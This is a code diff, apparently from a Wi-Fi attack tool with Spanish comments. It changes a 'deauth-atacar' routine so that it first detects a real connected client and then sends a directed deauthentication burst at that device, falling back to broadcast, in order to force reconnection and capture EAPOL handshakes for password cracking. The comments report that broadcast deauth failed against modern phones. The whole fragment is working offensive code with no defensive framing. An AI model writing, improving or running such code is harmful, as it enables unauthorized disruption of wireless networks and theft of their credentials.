@@ -3143,7 +3143,26 @@ const m = await window.__invoke('activate_monitor', { ifaceGuid: natGuid, channe
       if (bssid && !hashFile && !natPcap) {
         setStage('Deauthing + capturando EAPOL (CH ' + (ch || '?') + ')…', 28);
         try {
-          const burst = await window.iaDeauthBurst({ bssid, channel: ch, target_mac: null, _hunter: false, sustained: false, watch_secs: 90 });
+          // FIX 2026-11-26: detectar el CLIENTE REAL y usar deauth DIRIGIDO.
+          // El broadcast (FF:FF:...) es ignorado por muchos móviles modernos;
+          // medido en red real: un móvil enviaba 26 Null frames (subtype 4)
+          // y detect_clients antes los descartaba → "0 clientes" → se emitía
+          // solo broadcast → el móvil nunca se reconectaba → 0 EAPOL.
+          let targetMac = null;
+          try {
+            const cs = await window.__invoke('detect_clients', { ifaceGuid: natGuid, bssid, durationSecs: 20 });
+            const knownBssids = new Set((lastNets || []).map(n => String(n.bssid || '').toUpperCase()));
+            const realClients = ((cs && cs.clients) || [])
+              .map(m => String(m).toUpperCase())
+              .filter(m => /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(m) && !knownBssids.has(m));
+            if (realClients.length) {
+              targetMac = realClients[0];
+              log('[deauth-atacar] cliente real detectado: ' + targetMac + ' → deauth DIRIGIDO.', 'ok');
+            } else {
+              log('[deauth-atacar] ' + ((cs && cs.message) || 'sin clientes') + ' → deauth BROADCAST (fallback).', 'warn');
+            }
+          } catch (e) { log('[deauth-atacar] detect_clients: ' + e + ' → broadcast', 'warn'); }
+          const burst = await window.iaDeauthBurst({ bssid, channel: ch, target_mac: targetMac, _hunter: false, sustained: false, watch_secs: 90 });
           log('[deauth-atacar] ' + ((burst && burst.message) || 'sin resultado'), burst && burst.success ? 'ok' : 'warn');
           if (burst && burst.success && burst.output_file) {
             hashFile = burst.output_file;
